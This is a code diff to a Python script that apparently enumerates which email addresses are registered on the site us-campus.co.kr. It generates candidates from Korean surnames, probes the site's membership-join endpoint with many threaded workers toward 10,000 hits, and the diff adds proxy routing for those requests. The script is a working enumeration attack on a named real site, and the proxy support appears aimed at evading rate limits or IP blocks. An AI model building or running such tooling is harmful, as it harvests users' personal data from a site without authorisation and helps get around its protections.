@@ -20,13 +20,13 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import date
 from http.cookiejar import CookieJar
 from pathlib import Path
-from urllib.request import HTTPCookieProcessor, HTTPSHandler, Request, build_opener
+from urllib.request import HTTPCookieProcessor, HTTPSHandler, ProxyHandler, Request, build_opener
 
 BASE = Path("/data/automation/results/us-campus.co.kr")
 STATE_DIR = BASE / "email_enum_state"
 TESTED_DB = STATE_DIR / "tested.db"
 GLOBAL_HITS = STATE_DIR / "hits_all.jsonl"
-CAND_VERSION = 3
+CAND_VERSION = 4
 
 ALL_SURNAMES = [
     "kim", "lee", "park", "choi", "jung", "jeong", "kang", "cho", "jo", "yoon", "yun", "jang", "lim", "im",
@@ -211,13 +211,24 @@ def iter_slim_emails(surnames):
                     yield e
 
 
-def ensure_candidate_file(shard_dir: Path, surnames, seen_hit: set):
+def make_opener(proxy_url: str = ""):
+    handlers = [HTTPCookieProcessor(CookieJar()), HTTPSHandler(context=CTX)]
+    if proxy_url:
+        handlers.insert(0, ProxyHandler({"http": proxy_url, "https": proxy_url}))
+    return build_opener(*handlers)
+
+
+def ensure_candidate_file(shard_dir: Path, surnames, seen_hit: set, shards: int):
     cand_file = shard_dir / "candidates.txt"
     meta_file = shard_dir / "candidates.meta.json"
     if cand_file.exists() and meta_file.exists():
         try:
             meta = json.loads(meta_file.read_text(encoding="utf-8"))
-            if meta.get("version") == CAND_VERSION and meta.get("count", 0) > 0:
+            if (
+                meta.get("version") == CAND_VERSION
+                and meta.get("shards") == shards
+                and meta.get("count", 0) > 0
+            ):
                 return cand_file, meta["count"]
         except Exception:
             pass
@@ -234,7 +245,7 @@ def ensure_candidate_file(shard_dir: Path, surnames, seen_hit: set):
             f.write(e + "\n")
             count += 1
     meta_file.write_text(
-        json.dumps({"version": CAND_VERSION, "count": count, "built": time.time()}, indent=2),
+        json.dumps({"version": CAND_VERSION, "shards": shards, "count": count, "built": time.time()}, indent=2),
         encoding="utf-8",
     )
     print(f"candidates written {count} in {time.time()-t0:.1f}s", flush=True)
@@ -358,9 +369,9 @@ def run_shard(args):
     tested_store = TestedStore(TESTED_DB, load_mem=False)
     hits, seen_hit = load_hits()
     surnames = shard_surnames(args.shard, args.shards)
-    print(f"shard={args.shard}/{args.shards} workers={args.workers}", flush=True)
+    print(f"shard={args.shard}/{args.shards} workers={args.workers} proxy={'yes' if args.proxy else 'no'}", flush=True)
 
-    cand_file, total_cands = ensure_candidate_file(shard_dir, surnames, seen_hit)
+    cand_file, total_cands = ensure_candidate_file(shard_dir, surnames, seen_hit, args.shards)
     print(f"candidates={total_cands} file={cand_file}", flush=True)
 
     line_no, file_offset = load_resume(cand_file, shard_dir)
@@ -382,9 +393,11 @@ def run_shard(args):
     batch_num = 0
     pending_global_hits = []
 
+    proxy_url = args.proxy or ""
+
     def get_op(force=False):
         if force or getattr(tls, "op", None) is None or getattr(tls, "n", 0) >= 500:
-            tls.op = build_opener(HTTPCookieProcessor(CookieJar()), HTTPSHandler(context=CTX))
+            tls.op = make_opener(proxy_url)
             tls.n = 0
             try:
                 tls.op.open(Request("https://us-campus.co.kr/member/join", headers={"User-Agent": "Mozilla/5.0"}), timeout=8)
@@ -514,6 +527,7 @@ def run_shard(args):
                         "hits": len(hits),
                         "errors": stats["errors"],
                         "rps": rps,
+                        "proxy": bool(proxy_url),
                     },
                     indent=2,
                 ),
@@ -540,6 +554,7 @@ def main():
     ap.add_argument("--batch-size", type=int, default=5000)
     ap.add_argument("--target", type=int, default=10000)
     ap.add_argument("--retries", type=int, default=3)
+    ap.add_argument("--proxy", default="", help="http://user:pass@host:port")
     run_shard(ap.parse_args())
 
 
